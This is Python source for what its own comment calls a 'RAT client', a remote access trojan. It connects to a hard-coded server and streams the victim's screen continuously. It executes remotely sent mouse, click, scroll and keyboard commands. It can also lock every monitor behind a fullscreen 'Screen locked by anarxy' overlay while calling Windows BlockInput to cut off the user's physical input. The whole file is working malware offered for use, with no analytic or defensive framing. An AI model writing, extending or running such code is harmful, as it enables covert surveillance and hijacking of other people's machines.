import socket
import mss
import cv2
import numpy as np
import pickle
import struct
import threading
from pynput.mouse import Controller as MouseController, Button
from pynput.keyboard import Controller as KeyboardController
from pynput.keyboard import Key as PynKey
import tkinter as tk
from PIL import Image, ImageTk
import platform
import ctypes
import requests
from io import BytesIO

server_ip = '192.168.1.248'  # Replace with your server IP
server_port = 9999

mouse = MouseController()
keyboard = KeyboardController()

keymap = {
    "BACKSPACE": PynKey.backspace,
    "ENTER": PynKey.enter,
    "SPACE": PynKey.space,
    "TAB": PynKey.tab,
    "ESC": PynKey.esc,
    "SHIFT": PynKey.shift,
    "CTRL": PynKey.ctrl,
    "ALT": PynKey.alt,
    "CAPSLOCK": PynKey.caps_lock,
    "DELETE": PynKey.delete,
    "UP": PynKey.up,
    "DOWN": PynKey.down,
    "LEFT": PynKey.left,
    "RIGHT": PynKey.right
}

# --- Side Button Support (Windows) ---
if platform.system() == "Windows":
    MOUSEEVENTF_XDOWN = 0x0080
    MOUSEEVENTF_XUP = 0x0100
    XBUTTON1 = 0x0001
    XBUTTON2 = 0x0002

    def click_xbutton(xbutton):
        ctypes.windll.user32.mouse_event(MOUSEEVENTF_XDOWN, 0, 0, xbutton, 0)
        ctypes.windll.user32.mouse_event(MOUSEEVENTF_XUP, 0, 0, xbutton, 0)

# -------------------------------------------------------------------
# LOCK SCREEN INFRASTRUCTURE (no global BlockInput, just local capture)
# -------------------------------------------------------------------
lock_root = None
lock_overlays = []
lock_img_tk = None

def init_lock_root():
    """Create one hidden Tk root to manage overlay windows (non-blocking)."""
    global lock_root
    lock_root = tk.Tk()
    lock_root.withdraw()  # hide main window
    lock_root.mainloop()

# Start a persistent hidden Tk root in the background
threading.Thread(target=init_lock_root, daemon=True).start()

def on_any_event(e):
    """Consume any event inside the lock overlay, preventing interaction."""
    return "break"  # Tells Tkinter to do nothing else with this event

def show_lock_screen_gui():
    """Show a fullscreen overlay on each monitor with text & image, capturing all events."""
    global lock_overlays, lock_img_tk, lock_root

    # Download the lock image (if not cached)
    if not lock_img_tk:
        try:
            res = requests.get("https://github.com/Anarxyfr/fdsa/blob/main/Anarxy.png?raw=true")
            image = Image.open(BytesIO(res.content)).resize((300, 300))
            lock_img_tk = ImageTk.PhotoImage(image)
        except:
            lock_img_tk = None

    # Gather monitor info
    with mss.mss() as sct:
        monitors = sct.monitors[1:]  # skip index 0 (the all-in-one monitor definition)

    # Create an overlay window per monitor
    for mon in monitors:
        win = tk.Toplevel(lock_root)
        win.overrideredirect(True)  # no title bar or borders
        win.geometry(f"{mon['width']}x{mon['height']}+{mon['left']}+{mon['top']}")
        win.configure(bg="black")
        win.attributes("-topmost", True)

        # Intercept all events to block them
        win.bind("<Key>", on_any_event)
        win.bind("<Button-1>", on_any_event)
        win.bind("<Button-2>", on_any_event)
        win.bind("<Button-3>", on_any_event)
        win.bind("<Motion>", on_any_event)
        win.bind("<MouseWheel>", on_any_event)
        # XBUTTON / etc. might not be recognized by Tk, but at least we block normal input

        canvas = tk.Canvas(win, bg="black", highlightthickness=0)
        canvas.pack(fill="both", expand=True)

        # Position the text near the top, so it doesn't overlap the image
        text_y = int(mon["height"] * 0.25)  # 25% from top
        canvas.create_text(mon["width"] // 2, text_y,
                           text="Screen locked by anarxy",
                           fill="white", font=("Arial", 48))

        # Position the image further down
        img_y = int(mon["height"] * 0.5)  # 50% from top
        if lock_img_tk:
            canvas.create_image(mon["width"] // 2, img_y, image=lock_img_tk)
        else:
            canvas.create_text(mon["width"] // 2, img_y,
                               text="[Image not available]",
                               fill="red", font=("Arial", 24))

        lock_overlays.append(win)

    # Block physical input (Windows only)
    if platform.system() == "Windows":
        try:
            ctypes.windll.user32.BlockInput(True)
        except Exception as e:
            print(f"[!] BlockInput failed (Admin required?): {e}")

def hide_lock_screen_gui():
    """Destroy all overlay windows and allow normal VM input again."""
    global lock_overlays
    for w in lock_overlays:
        try:
            w.destroy()
        except:
            pass
    lock_overlays.clear()

    # Unblock physical input (Windows only)
    if platform.system() == "Windows":
        try:
            ctypes.windll.user32.BlockInput(False)
        except Exception as e:
            print(f"[!] BlockInput failed (Admin required?): {e}")

# -------------------------------------------------------------------
# MAIN RAT CLIENT
# -------------------------------------------------------------------
s = socket.socket()
s.connect((server_ip, server_port))

with mss.mss() as sct:
    monitor = sct.monitors[1]
    width = monitor["width"]
    height = monitor["height"]

    while True:
        # Capture screen
        frame_np = np.array(sct.grab(monitor))
        frame = cv2.cvtColor(frame_np, cv2.COLOR_BGRA2BGR)

        # Encode as JPEG for low-latency
        _, encimg = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
        data = pickle.dumps((encimg, width, height))
        s.sendall(struct.pack(">L", len(data)) + data)

        # Check for incoming commands
        s.settimeout(0.01)
        try:
            raw = s.recv(4, socket.MSG_PEEK)
            if raw:
                cmd_size = struct.unpack(">L", s.recv(4))[0]
                cmd_data = b''
                while len(cmd_data) < cmd_size:
                    cmd_data += s.recv(cmd_size - len(cmd_data))
                cmd = cmd_data.decode()
                parts = cmd.split(":")

                if parts[0] == "MOVE":
                    x, y = int(parts[1]), int(parts[2])
                    mouse.position = (x, y)

                elif parts[0] == "CLICK":
                    if parts[1].upper() == "LEFT":
                        mouse.click(Button.left)
                    elif parts[1].upper() == "RIGHT":
                        mouse.click(Button.right)

                elif parts[0] == "SCROLL":
                    mouse.scroll(0, int(parts[1]))

                elif parts[0] == "XBUTTON":
                    if platform.system() == "Windows":
                        if parts[1] == "1":
                            click_xbutton(XBUTTON1)
                        elif parts[1] == "2":
                            click_xbutton(XBUTTON2)

                elif parts[0] == "KEY":
                    key = parts[1]
                    try:
                        if key.upper() in keymap:
                            target_key = keymap[key.upper()]
                        else:
                            target_key = key.lower()
                        keyboard.press(target_key)
                        keyboard.release(target_key)
                    except Exception as e:
                        print(f"[!] Key error: {e}")

                elif parts[0] == "LOCKSCREEN":
                    print("[*] Lock screen triggered.")
                    if lock_root:
                        # Use 'after(0, ...)' so it happens on the Tk thread
                        lock_root.after(0, show_lock_screen_gui)

                elif parts[0] == "UNLOCKSCREEN":
                    print("[*] Unlock screen triggered.")
                    if lock_root:
                        lock_root.after(0, hide_lock_screen_gui)

        except socket.timeout:
            continue
